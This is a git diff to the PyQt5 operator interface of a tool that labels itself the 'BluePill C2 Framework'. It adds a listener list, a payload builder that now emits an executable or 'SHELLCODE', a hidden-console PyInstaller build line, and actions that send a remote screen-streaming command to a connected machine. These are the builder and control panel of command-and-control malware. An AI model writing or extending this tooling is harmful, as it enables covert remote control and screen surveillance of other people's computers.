@@ -1,4 +1,4 @@
-
+#pyinstaller --clean -y --onefile --noconsole --add-data "src\binary_data.bin;src" bluepill.py --icon=C:\Users\Hamz2\Pictures\Screenshots\Screenshot_20230214_232721.png
 import sys
 from PyQt5.QtWidgets import QApplication, QMessageBox, QMainWindow, QTableWidget, QPushButton, QVBoxLayout, QWidget, QHeaderView, QAbstractItemView, QMenu, QHBoxLayout,QLabel, QStackedLayout
 from PyQt5.QtCore import Qt, QEvent
@@ -79,7 +79,10 @@ class BuilderWindow(QMainWindow):
         self.tree_view = QTreeWidget()
         self.tree_view.setHeaderHidden(True)
         main_layout.addWidget(self.tree_view)
-
+        item = QTreeWidgetItem(self.tree_view)
+        for addresses in self.info.listening_connections:
+            print(addresses)
+            item.setText(0, f"IP: {addresses[0]}, Port: {addresses[1]}")
         # Create buttons for adding and deleting items
         button_layout = QHBoxLayout()
         add_button = QPushButton("+")
@@ -105,7 +108,7 @@ class BuilderWindow(QMainWindow):
         # Create the dropdown box with an object name
         dropdown = QComboBox()
         dropdown.setObjectName("dropdown")
-        dropdown.addItems(["EXE", "ByteCode"])
+        dropdown.addItems(["EXE", "SHELLCODE"])
         main_layout.addWidget(dropdown)
 
         submit_button = QPushButton("Submit")
@@ -113,6 +116,7 @@ class BuilderWindow(QMainWindow):
         main_layout.addWidget(submit_button)
 
     def add_tree_item(self):
+        item = QTreeWidgetItem(self.tree_view)
         dialog = AddItemDialog(self)
         if dialog.exec_():
             ip, port = dialog.get_ip_and_port()
@@ -127,9 +131,8 @@ class BuilderWindow(QMainWindow):
                 print("CANNOT LISTEN AT THAT PROTOCAL OR PORT")
                 return
             if ip and port:
-                item = QTreeWidgetItem(self.tree_view)
                 server_thread = threading.Thread(target=self.info.bluepill.initiate_server, args=(ip, port))
-                server_thread.daemon = True  # Set the thread as a daemon to exit when the main program exits
+                server_thread.daemon = True 
                 server_thread.start()
                 item.setText(0, f"IP: {ip}, Port: {port}")
 
@@ -157,7 +160,7 @@ class BuilderWindow(QMainWindow):
             bytecode = builder.compile_exe()
             with open(filename, "wb") as _file:
                 _file.write(bytecode)
-            self.show_message_box("BluePill C2 Framework", "Your executable has been generated.")
+            self.show_message_box("BluePill C2 Framework", "Your executable has been generated")
         elif dropdown_data.lower() == "shellcode":
             bytecode = builder.gethex()
             with open(filename, "w") as _file:
@@ -395,6 +398,7 @@ class MyWindow(QMainWindow):
             if not self.remote_window[int(row_id)-1]:
                 row_id, _ = self.get_row()
                 self.bluepill.send(b"stream", self.connection[int(row_id)-1])
+                print("SENT STREAM SIGNAL")
                 ScreenshotWindow(str(row_id), self.display_info[int(row_id)-1], parent=self).show()
                 self.remote_window[int(row_id)-1] = True
         elif action == executeFile:
